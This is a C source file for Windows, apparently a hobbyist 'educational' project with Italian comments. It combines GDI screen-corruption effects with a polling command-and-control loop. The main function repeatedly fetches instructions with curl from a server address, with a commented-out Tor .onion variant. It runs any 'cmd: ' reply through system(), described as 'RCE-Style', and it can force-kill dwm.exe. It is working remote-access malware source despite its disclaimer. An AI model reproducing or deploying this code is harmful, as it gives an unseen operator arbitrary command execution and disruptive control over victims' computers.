/*
{:-)} ---> Introduction <--- {(-:}

WARNING: This software is intended strictly for research and educational purposes only.
Created by ElektroWindows. No AI generated code has been used for this project; AI tools and agents were
used exclusively used for debugging support.
The program is capable of rendering GDI-based visual effects, displaying system messages,
and executing commands in a controlled and experimental environment (Like cybersecurity labs or VM)

TL;TR {
    What this software DOESN'T:
        Delete or touch your files;
        Touch boot settings;
        Makes your computer unbootable;
        Freaky things that real malware do;

    What this software DOES:
        Create GDI visual fx;
        Command execution;
        Display custom messages;
}

WHY THIS PROJECT?
I just wanted to know how create various effects in Windows Operating system,
so I decided to write this project. Obviusly for learning and educational purpose only.

WHY ONLY ONE FILE?
I decided to keep the project simple. Every function in the same file. I think it looks clean
and very readable. In this project everything is commented but in italian.
So I will create 2 files. 1 with english comments and the other with original comments (the original one).

{:-)} ---> End Introduction <--- {(-:}
*/

// compile 4 windows: cl C:\Users\user\Desktop\GDIManager.c /O2 /link gdi32.lib user32.lib
// devi compilare dalla shell di sviluppo x64 di vscommunity

// Inizio flag per Windows
#ifdef _WIN32
    #define popen _popen // MSVC non riconosce popen, ma _popen, quindi definisce popen as _popen, idem con pclose
    #define pclose _pclose
#endif
#define _WIN32_WINNT 0x0600
#define WINVER 0x0600
// Fine flag per Windows

#include <windows.h>
#include <math.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

/*
BitBlt usage:
BitBlt(hdcDest, TakeX, TakeY, TakeW, TakeH, hdcSrc, XSrc, YSrc, MODE)

Modes:
SRCCOPY - Copy
NOTSRCCOPY - Color invert
SRCINVERT - PXColor = PXColorDest + PXColoreSRC
BLACKNESS - black block
WHITENESS - white block
*/


//globalz
int w; // width
int h; // heigh

void heightglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % w; // random lungo w
    BitBlt(hdc, x, 0, 10, h, hdc, x, 0, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void widthglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % h; // random lungo h
    BitBlt(hdc, 0, x, w, 10, hdc, 0, x, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void tunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);

    int newW = w - (1 * w / 100);
    int newH = h - (1 * h / 100);

    // trova il centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void circleshake_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    static float angle = 0.1f;

    int dx = (int)(sin(angle) * 2);
    int dy = (int)(cos(angle) * 2);

    BitBlt(hdc, dx, dy, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);

    angle = angle + 0.1f;
    Sleep(10);
}

void ltunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    
    int newW = w - (10 * w / 100);
    int newH = h - (10 * h / 100);

    // centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

// ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
// Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
// DC = DeviceContext
void squarefx_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    
    //variabili statiche bcz con il while(1) esterno non verranno inizializzate in loop
    //non settare x e y a 0, altrimenti non va (idk why)
    static int x = 3;
    static int y = 3;

    //px space x&y
    static int vx = 21;
    static int vy = 21;

    int rx = 0;
    int ry = 0;

    rx = 1 + rand() % 500;
    ry = 1 + rand() % 500;

    int red = rand() % 255;
    int green = rand() % 255;
    int blue = rand() % 255;

    HBRUSH white = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed nero
    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco

    Rectangle(hdc, x, y, x + rx, y + ry); // top, left, bottom, right

    //collisione destra/sinistra
    if (x + 100 >= w || x <= 0) {
        vx = -vx;
    }

    //collisione alto/basso
    if (y + 100 >= h || y <= 0) {
        vy = -vy;
    }

    //movimento
    x = x + vx;
    y = y + vy;

    // quelle di sopra sono condizioni, non muovono un cazzo, grazie alla parte finale qualcosa si muove.

    //avoid mem leaks
    DeleteObject(white);
    ReleaseDC(NULL, hdc);
    Sleep(5);
}

// avevo pensato qualcosa del tipo: progressivita' del degrado. Ogni tot si diminuisce la reso
//Update: se divido per 2 l'effetto si interrompe alla prima degradata, se divido per un valore>2 il degrado e' progressivo
// ATTENTO: non fare: "HDC small" small e' una cosa di windows preistorica. Quindi ho usato smally
void pixelate() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);

    // un compatibleDC crea in ram una tela che non viene mostrata (serve per lavorare e non mostrare schifo nel monitor)
    HDC smally = CreateCompatibleDC(hdc);
    HBITMAP smallybmp = CreateCompatibleBitmap(hdc, w/2.1, h/2.1); //  qui ci sta il hdc ma scalato di pixel

    SelectObject(smally, smallybmp); // inserisce smallybmp dentro smally

    StretchBlt(smally, 0, 0, w/2.1, h/2.1, hdc, 0, 0, w, h, SRCCOPY); // prendi il hdc e lo copi su smally
    SetStretchBltMode(hdc, COLORONCOLOR); // coloroncolor = no blur, no smooth, only raw pixelz
    StretchBlt(hdc, 0, 0, w, h, smally, 0, 0, w/2.1, h/2.1, SRCCOPY); // prende bitmap piccola e la allarga in full

    //togli schifo
    DeleteObject(smallybmp);
    DeleteDC(smally);
    ReleaseDC(NULL, hdc);

    Sleep(10);
}

void lulu() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL); // piglia il dc dello schermo
    HDC memdc = CreateCompatibleDC(hdc); // crea un DC compatibile in ram

    //karika il bmp (assicurati che sia real bmp. Esporta da paint per sicurezza)
    HBITMAP bmp = (HBITMAP)LoadImageA(NULL, "lulu.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

    // usa bitmap nel memdc
    SelectObject(memdc, bmp);

    int randx = rand() % w;
    int randy = rand() % h;

    BitBlt(hdc, randx, randy, 776, 788, memdc, 0, 0, SRCCOPY); // 776, 778 = px imagine bmp

    //togli merda (aka burn garbage; aka free mem; akak liberation; aka: restituisci risorsa grafica. MUà! )
    DeleteObject(bmp);
    DeleteDC(memdc);
    ReleaseDC(NULL, hdc);
    Sleep(2);
}

void fkngmelter() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    static int x = 0; // static, altrimenti reset brutale a causa di rand che riparte dal seed 0

    x = rand() % w;
    BitBlt(hdc, x, 5, 4, h, hdc, x, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(2);
}

void predictablemelter() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);

    static int counter = 0;
    counter = counter + 1;

    if (counter >= w) {counter = 0;} // resetta il counter se supera lo schermo in larghezza

    BitBlt(hdc, counter, 5, 5, h, hdc, counter, 0, SRCINVERT);
    ReleaseDC(NULL, hdc);
    Sleep(1);
}

void mtrfkngatombomb() {
    HDC hdc = GetDC(NULL);

    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    BitBlt(hdc, rand()%20 -10, rand()% 20 - 10, w, h, hdc, 0, 0, SRCINVERT); // srcinvert fa: DEST XOR SOURCE
    Sleep(10);

    // release shi
    ReleaseDC(NULL, hdc);
    Sleep(10);
}

void squaryshape() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);

    int rx = 0;
    int ry = 0;

    rx = 1 + rand() % 200;
    ry = 1 + rand() % 200;

    int x = rand() % w;
    int y = rand() % h;

    // kolorz
    int red = rand() % 255;
    int green = rand() % 255;
    int blue = rand() % 255;

    HBRUSH white = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed nero
    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco

    Rectangle(hdc, x, y, x + rx, y + ry); // top, left, bottom, right

    //avoid mem leaks
    DeleteObject(white);
    ReleaseDC(NULL, hdc);
    Sleep(1);
}

void startfx() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    //yeahhh starta a bestia!
    heightglitch_run();
    widthglitch_run();
    tunnel_run();
    circleshake_run();
    ltunnel_run();
    squarefx_run();
    fkngmelter();
    mtrfkngatombomb();
    squaryshape();
}

void msgbox() {
    srand(time(NULL)); // inizializza un seme per rand, metti ogni volta che usi rand() per avere numeri piu' entropici e meno prevedibili
    // [x][y]
    // x = contenitore (aka skatola)
    // y = byte (o char (bcz 1 char = 1 byte)) per contenitore
    // se ho x byte devo dichiarare x + 1. Ex: in una frase di 7 char ne devo dikiarare 8 bcz '\0' ('\0' sta sempre alla fine!)
    // if u want puoi togliere il [7] in [], il compilatore capisce dal numero di frasi.
    char frasi[7][200] = { // ricordiamo il seguente personaggio: Breiscot (aka DMAX, QLIMAX, EMACS) - Ha dato contributo nelle frasi di testing
        "Non prendere la vita troppo seriamente. Non ne uscirai vivo.",
        "Il piacere piu' grande della vita e' fare cio' che le persone dicono che non puoi fare",
        "Dovresti ascoltare piu' hardstyle... Ye, sono serio",
        "C'e' una canzone che fa: TU TU TU TU TU TU TU TUTUTU BRBRBRBRBRBRBRBRBRBRBRBR",
        "Secondo te dovrei usare dei puntatori o degli array per mostrare ste frasi con rand()?",
        "Pensa che esiste gente cosi' stupida che mette l'uovo nell'insalata di riso",
        "Che tristezza la neomelodica :("
    };

    int randomtext = rand() % 7; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
    MessageBox(NULL, frasi[randomtext], "Subwoofer", MB_OK | MB_ICONINFORMATION);
}

void cleandwm() {
    system("TASKKILL /F /IM dwm.exe");
    Sleep(20000);
}

// non usare GetTickCount() perchè usa cifre a 32 bit, quindi dopo 49 dayz circa va in overflow 
void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs')
    int w = GetSystemMetrics(SM_CXSCREEN) / 2; // piglio la meta' per ottenere il centro
    int h = GetSystemMetrics(SM_CYSCREEN) / 2; // idem qui

    HDC hdc = GetDC(NULL);

    //parametri & settings 4 dwm displaying
    SetBkMode(hdc, OPAQUE); // no bordi strani dietro
    SetTextColor(hdc, RGB(255,0,0)); // colore testo red
    HFONT font = CreateFont(128, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
    SelectObject(hdc, font);

    int now = time(NULL); //ora
    int future = now + secs; // secs futuri
    
    while (now < future) {
        Sleep(10);

        now = time(NULL); // adesso, in secs
        int remaining = future - now; // calcola il rimanente

	    char countdowndata[64]; // buffer di char (64), NON SUPERARE MAI I 64 CHAR! (molto difficile che succeda)
        sprintf(countdowndata, "COUNTDOWN: %d", remaining); // metti su countdowndata: "COUNTDOWN: " + remaining.

        TextOut(hdc, w, h, countdowndata, strlen(countdowndata)); // l'ultimo param (dove c'e' strlen) prende la lunghezza di countdowndata e la usa per avoidare la lettura di mem altrove.
    }

    // fx exhibition
    ULONGLONG elapsed = GetTickCount64(); // timer dal boot del kernel. Cifra a 64bit
    while (1) {
        if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, "Elektro was here!", 17);} // 17 = num di char del text
        else if (GetTickCount64() - elapsed < 5000) {fkngmelter();}
        else if (GetTickCount64() - elapsed < 10000) {pixelate();squaryshape();}
        else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();mtrfkngatombomb();}
        else if (GetTickCount64() - elapsed < 14000) {pixelate();}
        else if (GetTickCount64() - elapsed < 17000) {widthglitch_run();mtrfkngatombomb();}
        else if (GetTickCount64() - elapsed < 21000) {lulu();squaryshape();}
        else if (GetTickCount64() - elapsed < 23000) {pixelate();}
        else if (GetTickCount64() - elapsed < 25000) {ltunnel_run();pixelate();}
        else if (GetTickCount64() - elapsed < 36000) {pixelate();}
        else if (GetTickCount64() - elapsed < 33000) {tunnel_run();mtrfkngatombomb();}
        else if (GetTickCount64() - elapsed < 43000) {mtrfkngatombomb();squaryshape();}
        else if (GetTickCount64() - elapsed < 44000) {pixelate();}
        else if (GetTickCount64() - elapsed < 63000) {squarefx_run();mtrfkngatombomb();}
        else if (GetTickCount64() - elapsed < 65000) {circleshake_run();pixelate();}
        else if (GetTickCount64() - elapsed < 69000) {tunnel_run();ltunnel_run();}
        else if (GetTickCount64() - elapsed < 77000) {fkngmelter();heightglitch_run();}
        else if (GetTickCount64() - elapsed < 88000) {mtrfkngatombomb();squaryshape();}
        else {break;}
    }
}

void wrongchoose() {
    ULONGLONG elapsed = GetTickCount64();
    MessageBoxW(NULL, L"Sai chi e' Lulu'?", L"Scegli", MB_YESNO | MB_ICONINFORMATION); // la (L"xyz") server per fare l'unicode e non ansi. Altrimenti le robbe tipo "eùàò" si sminchianoo
    MessageBox(NULL, "Mi dispiace, hai sbagliato", "LULU.EXE", MB_OK | MB_ICONERROR);
    while(1) {
        if (GetTickCount64() - elapsed < 60000) {lulu();pixelate();mtrfkngatombomb();}
        else if (GetTickCount64() - elapsed < 80000) {fkngmelter();mtrfkngatombomb();}
        else {break;}
    }
}

int main() {
    while(1) {
        printf("Clean\n");
        char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
        //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
        FILE *pointertotextstream = popen("curl -s http://192.168.122.1:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output (SOLO LA PRIMA RIGA)

        if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
        
        if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
            pclose(pointertotextstream);
            printf("Sleeping for 20secz\n");
            Sleep(20000);
            continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
        } 
        reqtextbuffer[strcspn(reqtextbuffer, "\r\n")] = '\0'; // serve per fare in modo che nel confronto delle opzioni si confronti il char identico e non il char + \r\n 
        pclose(pointertotextstream); // chiude il processo creato da popen (curl) (NEVER FORGET! Altrimenti fai un mem leak più grande di casa mia e più pesante del mio subwoofer con hp e sounbar integrata)
        printf("reqtextbuffer[]: %s\n", reqtextbuffer);

        /* 
        Sicrez codz:
        AllFx - 1
        HeighGlitch - 2
        WidthGlitch - 3
        TunnelRun - 4
        CircleShake - 5
        LongTunnel(morePX) - 6
        BouncySquare - 7
        FkngMelter - 8

        Misc:
        "cmd: " - xec a command
        "CleanDWM" - cleana DWM
        "RandomMSGs" - msgbox()
        "Timer: x" - start countdown stuff
        */

        if (strcmp(reqtextbuffer, "1") == 0) {
            int i;
            for (i=0;i<100;i++) {startfx();}
        }

        else if (strcmp(reqtextbuffer, "2") == 0) {
            int i;
            for(i=0;i<100;i++) {heightglitch_run();}
        }

        else if (strcmp(reqtextbuffer, "3") == 0) {
            int i;
            for(i=0;i<100;i++) {widthglitch_run();}
        }

        else if (strcmp(reqtextbuffer, "4") == 0) {
            int i;
            for(i=0;i<100;i++) {tunnel_run();}
        }

        else if (strcmp(reqtextbuffer, "5") == 0) {
            int i;
            for (i=0;i<100;i++) {circleshake_run();}
        }

        else if (strcmp(reqtextbuffer, "6") == 0) {
            int i;
            for (i=0;i<100;i++) {ltunnel_run();}
        }

        else if (strcmp(reqtextbuffer, "7") == 0) {
            int i;
            for (i=0;i<500;i++) {squarefx_run();}
        }

        else if (strcmp(reqtextbuffer, "8") == 0) {
            int i;
            for (i=0;i<1000;i++) {fkngmelter();}
        }

        else if (strcmp(reqtextbuffer, "9") == 0) {
            int i;
            for (i=0;i<200;i++) {mtrfkngatombomb();}
        }

        else if (strcmp(reqtextbuffer, "10") == 0) {
            int i;
            for (i=0;i<1000;i++) {squaryshape();}
        }

        else if (strcmp(reqtextbuffer, "11") == 0) {
            int i;
            for (i=0;i<4000;i++) {predictablemelter();}
        }

        else if (strcmp(reqtextbuffer, "Lulu") == 0) {
            int i;
            for (i=0;i<500;i++) {lulu();}
        }

        else if (strcmp(reqtextbuffer, "Pixy") == 0) {
            int i;
            for (i=0;i<150;i++) {pixelate();}
        }

        else if (strcmp(reqtextbuffer, "CHOOSE") == 0) {
            wrongchoose();
        }

        else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
            char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
            command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
            system(command); // esegui (RCE-Style)
            printf("Command Executed\n");
            printf("Sleeping for 20 secs\n");
            Sleep(20000);
        }

        else if (strcmp(reqtextbuffer, "CleanDWM") == 0) {cleandwm();}
        else if (strcmp(reqtextbuffer, "RandomMSGs") == 0) {msgbox();}

        else if (strstr(reqtextbuffer, "Timer: ")) {
            printf(reqtextbuffer);
            char *timer = reqtextbuffer + 7; // 7 char su "Timer: " (more doc? scrolla sopra)
            timer[strcspn(timer, "\r\n")] = '\0'; // idem qui, checcka sopra
            int secs = atoi(timer);
            printf(timer);
            countdown(secs);
        }
        else {Sleep(20000);}
    }
    return 0;
}
